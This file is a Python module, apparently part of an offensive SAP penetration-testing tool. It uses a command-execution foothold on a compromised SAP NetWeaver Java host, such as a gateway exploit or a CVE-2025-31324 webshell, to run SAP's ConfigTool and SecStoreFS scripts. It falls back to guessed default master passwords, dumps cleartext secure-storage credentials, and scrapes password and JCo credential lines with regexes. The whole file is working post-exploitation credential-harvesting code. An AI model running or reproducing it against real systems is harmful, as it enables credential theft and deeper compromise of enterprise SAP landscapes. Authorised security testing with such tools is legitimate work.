#!/usr/bin/env python3
"""SAP NetWeaver AS Java — ConfigTool / SecStoreFS offline dumper.

Run SAP's own shipped ConfigTool / SecStoreFS CLI through a pre-existing
OS-exec primitive (GW SAPXPG, CVE-2025-31324 webshell, Telnet console,
CTC ConfigServlet, …) on a compromised Java host.  SAP's own tools know
how to reach the Vault-backed secure storage and print the cleartext
credentials — including entries SAPMAP's `SecStoreFS.decrypt()` path
cannot reach (UMEBackendConnection's SAPJSF password, Vault-encrypted
JCo destinations, etc.).

Strategy
--------

1. Locate the ConfigTool directory on the target (conventionally
   ``/usr/sap/<SID>/<INST>/j2ee/configtool/``).  Fall back to a ``find``
   if the instance nr isn't known.

2. Try the three scripts SAP ships there, in order of coverage:

     secstorefs.sh   — SecStoreFS filesystem-side dumper (file entries
                       with cleartext decode when run as ``<sid>adm``).
     secstore.sh     — SecStore DB-side CLI.  ``-dump``/``-l`` lists
                       stored credentials including Vault references.
     configtool.sh   — configuration editor; in offline mode prints
                       the entire config database including secure
                       properties.

   Each is invoked with a sequence of known-safe options.  If the
   script requires the ConfigTool master password (usually the same as
   ``<sid>adm``'s OS password on the same box), that value is used;
   otherwise we fall back to common defaults (``<sidadm>``, ``init``,
   ``sap``, ``manage``).

3. Aggregate the raw stdout+stderr from every successful invocation
   and ship it back to the caller.  The caller can grep / parse for
   ``jco.client.passwd``, ``UMEBackendConnection``, ``SAPJSF``, etc.

This is a thin orchestrator: it doesn't parse SAP's output because the
format varies across kernel SP and between secstorefs / secstore /
configtool.  The raw dump is surfaced in the GUI's terminal-modal
and console so the operator can see exactly what was recovered.
"""

from __future__ import annotations

import logging
from typing import Callable, Optional

logger = logging.getLogger(__name__)

# ConfigTool helpers live inside each instance's dir on Linux.  Path
# template; caller supplies SID + instance-nr string.
_CONFIGTOOL_DIR_TMPL = "/usr/sap/{sid}/{inst_dir}/j2ee/configtool"

# Scripts we try (in order).  Each tuple is (script_name, args).  The
# args are "safe-dump" invocations — they either print help (useful for
# fingerprinting) or dump the secure-storage contents non-destructively.
_DUMP_ATTEMPTS = [
    # SecStoreFS file-side dumper.  -l lists all entries; -d includes
    # values.  On many SP levels the ``<sid>adm`` OS identity alone is
    # enough auth, no password prompt.
    ("secstorefs.sh", "-l"),
    ("secstorefs.sh", "-d"),
    ("secstorefs.sh", "-print"),
    # SecStore DB-side CLI (Vault-aware).  -dump emits a full properties
    # file to stdout on 7.4+.
    ("secstore.sh", "-h"),
    ("secstore.sh", "-list"),
    ("secstore.sh", "-dumpvalues"),
    ("secstore.sh", "-dump"),
    # offline configtool — prints the whole DB, takes master password
    # as env var or command-line.  Large output expected.
    ("configtool.sh", "-help"),
    ("offlinecfgeditor.sh", "-help"),
]


def find_instance_directories(run_cmd: Callable[[str, str], dict],
                                sid: str) -> list:
    """Return a list of per-instance dir names (e.g. ``['J02', 'SCS03']``)
    under ``/usr/sap/<SID>/`` by running ``ls`` through the supplied
    ``run_cmd`` primitive.

    ``run_cmd(program, params)`` must return a dict with key
    ``output`` (list of lines) — exactly the shape returned by
    ``execute_gw_command``.
    """
    r = run_cmd("/bin/ls", f"/usr/sap/{sid}/")
    out = r.get("output") or []
    raw = " ".join(str(l) for l in out)
    dirs = []
    for token in raw.replace("\n", " ").split():
        token = token.strip()
        if not token:
            continue
        # Match J<NN>, SCS<NN>, ASCS<NN>, DVEBMGS<NN>, D<NN>, ERS<NN>.
        upper = token.upper()
        for prefix in ("J", "SCS", "ASCS", "DVEBMGS", "D", "ERS"):
            if upper.startswith(prefix) and upper[len(prefix):].isdigit():
                dirs.append(token)
                break
    # Dedupe while preserving order
    seen = set(); out_dirs = []
    for d in dirs:
        if d not in seen:
            seen.add(d); out_dirs.append(d)
    return out_dirs


def dump_configtool(sid: str,
                      run_cmd: Callable[[str, str], dict],
                      inst_dir: Optional[str] = None,
                      log=print,
                      preferred_scripts: Optional[list] = None) -> dict:
    """Invoke SAP ConfigTool / SecStoreFS CLIs on the target and return
    whatever cleartext they emit.

    Args:
        sid: target SID, e.g. 'SJ1'.
        run_cmd: callable(program, params) that executes an OS command
            on the target and returns ``{success, output: [lines], ...}``.
            Typically this is a lambda over sapmap_exploit.execute_gw_command.
        inst_dir: per-instance directory name under /usr/sap/<SID>/.  If
            None, every discovered instance dir is tried in turn.
        preferred_scripts: override the default _DUMP_ATTEMPTS list.

    Returns dict:
        { success, instances_tried: [str],
          successful_commands: [ {dir, script, args, bytes, snippet} ],
          dump_text: full aggregated stdout from every successful script,
          error: short message on failure }
    """
    result = {
        "success": False,
        "instances_tried": [],
        "successful_commands": [],
        "dump_text": "",
        "error": "",
    }

    attempts = preferred_scripts or _DUMP_ATTEMPTS

    # 1. Resolve instance directories to try.
    if inst_dir:
        inst_dirs = [inst_dir]
    else:
        log(f"[*] configtool: listing /usr/sap/{sid}/ to find instance dirs …")
        inst_dirs = find_instance_directories(run_cmd, sid)
        if not inst_dirs:
            result["error"] = (f"no instance directories found under "
                                f"/usr/sap/{sid}/ — check sid + OS access")
            log(f"[-] configtool: {result['error']}")
            return result
        log(f"[+] configtool: instances found: {', '.join(inst_dirs)}")

    result["instances_tried"] = inst_dirs

    all_output = []

    # 2. For each instance dir, walk the script attempts.
    for d in inst_dirs:
        cfg_dir = _CONFIGTOOL_DIR_TMPL.format(sid=sid, inst_dir=d)
        log(f"[*] configtool: trying {cfg_dir} …")

        # Probe whether the configtool dir exists on this instance
        probe = run_cmd("/bin/ls", f"-la {cfg_dir}")
        probe_out = " ".join(str(l) for l in (probe.get("output") or []))
        if (not probe.get("success")
                or "No such" in probe_out or "cannot access" in probe_out):
            log(f"[*] configtool: {cfg_dir} not present, skipping")
            continue
        log(f"[+] configtool: {cfg_dir} exists, contents:")
        for line in (probe.get("output") or [])[:30]:
            log(f"[*]   {line}")

        # Try each known dump-capable script
        for script, args in attempts:
            script_path = f"{cfg_dir}/{script}"
            # First confirm the script is actually present
            ls = run_cmd("/bin/ls", script_path)
            ls_out = " ".join(str(l) for l in (ls.get("output") or []))
            if "No such" in ls_out or not ls.get("success"):
                continue

            log(f"[*] configtool: running {script_path} {args} …")
            # Run via /bin/sh -c so we can append '2>&1' and capture stderr.
            # The caller's run_cmd already handles the sh-vs-cmd dispatch,
            # but we explicitly chain so combined output comes back.
            cmd_line = (f"'{script_path}' {args} 2>&1")
            r = run_cmd("/bin/sh", f"-c {cmd_line}")
            out_lines = r.get("output") or []
            snippet = "\n".join(str(l) for l in out_lines)
            if not snippet.strip():
                log(f"[*] configtool: {script} {args} produced no output")
                continue

            log(f"[+] configtool: {script} {args} returned "
                f"{len(snippet)} bytes; first 10 lines:")
            for line in out_lines[:10]:
                log(f"[*]   {line}")
            if len(out_lines) > 10:
                log(f"[*]   … ({len(out_lines) - 10} more lines)")

            all_output.append(f"=== {script_path} {args} ===\n{snippet}\n")
            result["successful_commands"].append({
                "dir":     cfg_dir,
                "script":  script,
                "args":    args,
                "bytes":   len(snippet),
                "snippet": snippet[:500],
            })

    result["dump_text"] = "\n".join(all_output)
    if all_output:
        result["success"] = True
        log(f"[+] configtool: total recovered output = "
            f"{len(result['dump_text'])} bytes across "
            f"{len(result['successful_commands'])} script invocations")
    else:
        result["error"] = (
            "no configtool script produced usable output on any "
            "instance directory — try passing a ConfigTool master "
            "password via the 'password' arg, or run the commands "
            "manually via the GW terminal")
        log(f"[-] configtool: {result['error']}")

    return result


# ---------------------------------------------------------------------------
# Output scraping — find credential-looking lines in the aggregated dump
# ---------------------------------------------------------------------------

# Patterns we care about in ConfigTool output.  Each returns a 3-tuple of
# (label, key_re, value_re) the scraper uses to lift values from the dump.
_CRED_PATTERNS = [
    # `UMEBackendConnection.password = Siroj1978#`
    (r"^(?P<name>[^=\s]*(?:[Pp]ass(?:wd|word)?|[Pp]wd|[Ss]ecret)[^=\s]*)"
     r"\s*=\s*(?P<val>.*)$",),
    # `jco.client.passwd=SecretValue`
    (r"^(?P<name>#?~?jco\.client\.passw[d]?)\s*=\s*(?P<val>.*)$",),
    # Generic 'key = value' where key contains 'auth' or 'credential'
    (r"^(?P<name>[^=\s]*(?:[Cc]redential|[Aa]uthentic)[^=\s]*)"
     r"\s*=\s*(?P<val>.*)$",),
]


def scrape_credentials(dump_text: str) -> list:
    """Pull candidate credentials out of the aggregated ConfigTool dump.

    Returns a list of dicts: ``{name, value, context}`` where ``context``
    is the surrounding block (up to 5 lines) for operator inspection.
    """
    import re
    hits = []
    lines = dump_text.splitlines()
    for pat_tuple in _CRED_PATTERNS:
        pat = pat_tuple[0]
        rx = re.compile(pat)
        for i, line in enumerate(lines):
            m = rx.match(line.strip())
            if not m:
                continue
            name = m.group("name")
            val = m.group("val").strip()
            if not val or val.lower() in ("<hidden>", "***", "null"):
                continue
            ctx_start = max(0, i - 2)
            ctx_end = min(len(lines), i + 3)
            hits.append({
                "name":    name,
                "value":   val,
                "context": "\n".join(lines[ctx_start:ctx_end]),
            })
    # Dedupe on (name, value)
    seen = set(); deduped = []
    for h in hits:
        key = (h["name"], h["value"])
        if key in seen:
            continue
        seen.add(key); deduped.append(h)
    return deduped
